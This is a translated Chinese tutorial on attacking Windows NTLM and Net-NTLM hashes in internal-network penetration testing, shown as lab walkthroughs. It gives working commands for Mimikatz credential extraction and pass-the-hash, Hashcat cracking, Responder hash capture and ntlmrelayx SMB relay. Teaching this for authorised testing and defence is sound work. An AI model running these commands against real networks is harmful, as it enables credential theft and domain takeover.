# 内网渗透——针对Hash的攻击

## 译文声明
本文为翻译文章，具体内容和含义以原文为准。

## 0x01 前言
本文将从Hash获取方式、爆破Hash、Hash中转和中继等方面进行全面分析。通过直观详细的实践来了解攻击过程，希望读者耐心阅读。

## 0x02 什么是NTLM Hash和Net-NTLM Hash
### NTLM Hash
NTLM Hash是Windows登录密码的一种哈希形式，可以从Windows系统中的SAM文件或域控制器的NTDS.dit文件中提取所有用户的Hash（例如使用Mimikatz）。获取该Hash后，可以进行明文爆破或哈希传递攻击（Pass-the-Hash, PtH）。

### Net-NTLM Hash
Net-NTLM Hash基于NTLM Hash值经过一定算法生成。获取Net-NTLM Hash后，可以进行明文爆破或利用SMB进行中继攻击，但不能用于哈希传递攻击。

### NTLM Hash的生成方法
1. 将明文口令转换为十六进制格式。
2. 将十六进制转换为Unicode格式，每个字节之后添加0x00。
3. 对Unicode字符串进行MD4加密，生成32位的十六进制数字串。

### 示例
使用Mimikatz工具从`lsass.exe`中提取Windows处于active状态的账号明文密码。以Windows Server 2012为例：
- NTLM Hash: A1E33A2281B8C6DBC2373BFF87E8CB6E
- 明文密码: 123456Abc

## 0x03 对NTLM Hash暴力破解
如果通过其他途径获得Hash值A1E33A2281B8C6DBC2373BFF87E8CB6E，可以使用Hashcat进行字典暴力破解。命令如下：
```bash
hashcat64.exe -m 1000 A1E33A2281B8C6DBC2373BFF87E8CB6E example.dict -o out.txt --force
```
- `-m 1000`：选择哈希类型为NTLM。
- `example.dict`：明文字典文件。
- `-o out.txt`：输出破解成功的明文。

打开`out.txt`，发现明文密码为123456Abc。

**注意**：Windows Server 2012 R2、Windows 8.1及更高版本禁止明文缓存到内存，因此Mimikatz无法直接获取明文密码。可以通过修改注册表来绕过这一限制。

## 0x04 NTLM哈希传递
哈希传递是指在不需要明文密码的情况下，使用NTLM Hash直接进行登录。当用户访问某些服务时，Windows会带上自身的认证信息尝试登录，这个认证信息实际上是Net-NTLM Hash。例如，访问SMB共享文件夹时，会使用认证信息尝试登录，并调用`lsass`内存中的Hash缓存。此时，可以使用Mimikatz等工具修改缓存的Hash为获取到的Hash，从而使用修改后的Hash进行登录。

### 认证请求过程
1. 客户端对本地密码进行加密生成密码散列。
2. 客户端发送认证请求，包含明文账号。
3. 服务器返回一个16位随机数作为challenge。
4. 客户端使用步骤1的密码散列加密challenge，并将结果返回给服务器。
5. 服务器将用户名、challenge和客户端返回的response发送到域控制器。
6. 域控制器使用用户名在SAM密码管理库中的密码散列，加密challenge。
7. 比较步骤4和步骤6的结果，如果一致则认证成功。

### Pth攻击演示
假设已获得NTLM Hash：
- 靶机IP：[靶机IP]
- 攻击机IP：[攻击机IP]

管理员身份运行Mimikatz：
```bash
sekurlsa::pth /user:Ancert /domain:WIN-0HE0PTAL9L4 /ntlm:A1E33A2281B8C6DBC2373BFF87E8CB6E
```

此时，可以使用获取的目标Hash进行登录认证。

## 0x05 Net-NTLM Hash获取
Net-NTLM Hash不能直接获取，但可以通过Responder工具拦截获取。此Hash不能用于哈希传递，但可以进行中继转发。结合Impacket的`ntlmrelayx.py`等工具，可以自动化进行拦截获取并中继转发。

### Responder操作演示
- 客户端IP：[客户端IP]
- 攻击机IP：[攻击机IP]

1. 无需编辑`Responder.conf`，因为此时SMB和HTTP服务保持开启。
2. 攻击机执行：
   ```bash
   python Responder.py -I eth0
   ```
3. 利用SMB协议，客户端在连接服务端时，默认使用本机的用户名和密码Hash尝试登录。模拟SMB服务器截获Hash，客户端执行以下命令之一：
   ```bash
   net use \hostshare
   attrib.exe \hostshare
   bcdboot.exe \hostshare
   ...
   ```

4. 攻击机成功收到NTLMv2-SSP Hash。

### 爆破Net-NTLM Hash
继续使用Hashcat进行Hash爆破：
```bash
hashcat64.exe -m 5600 Ancert::WIN-0HEOPTAL9L4:75c3bef66ef94f92:2424A1EA007E01413DD6653404BB7819:... example.dict -o out.txt --force
```

参数说明：
- `-m 5600`：选择哈希类型为net-NTLM。

打开`out.txt`，发现破解出明文密码123456Abc。

## 0x06 SMB中继攻击
获取到Net-NTLM Hash后，由于不能通过哈希传递的方式进行认证，可以通过Responder工具拦截管理员的Net-NTLM Hash，并配合`ntlmrelayx.py`进行中继转发。

### Impacket下载
```bash
git clone https://github.com/CoreSecurity/impacket.git
```

### 中继前提
目标SMB签名需要关闭。SMB签名和加密保护服务器和客户端之间传输数据的完整性。如果关闭SMB签名，攻击者可以拦截认证过程并将获得的Hash在其他机器上重放，从而获得域管权限。

### 中继转发操作
- 域内普通用户-受害者机器（Win7）
- 域管理员(administrator)机器（Windows Server 2012 R2）
- Kali Linux 攻击者机器

1. Responder关闭SMB和HTTP服务。
2. 执行：
   ```bash
   python Responder.py -I eth0 -r -d –w
   ```
3. 执行：
   ```bash
   python ntlmrelayx.py -tf targets.txt -socks -smb2support
   ```

`targets.txt`内容为域内受害IP 192.168.191.139。

4. 域管模拟输入一个共享，生成一个LLMNR请求。
5. 通过Responder发送。
6. NTLMv2哈希凭据被中继。

### 攻击流程总结
1. 关闭Responder的SMB和HTTP服务，运行Responder工具截取Net-NTLM哈希值。
2. 运行`ntlmrelayx.py`脚本，将Net-NTLM哈希值发送到脚本的SMB和HTTP服务。
3. `ntlmrelayx.py`将Hash发送到目标列表中，如果中继操作成功会触发通知命令。

希望读者通过本文对Hash攻击有更深入的理解。在后续文章中，我们将结合DeathStar和Empire，演示自动化域渗透以及对Net-NTLM Hash的利用。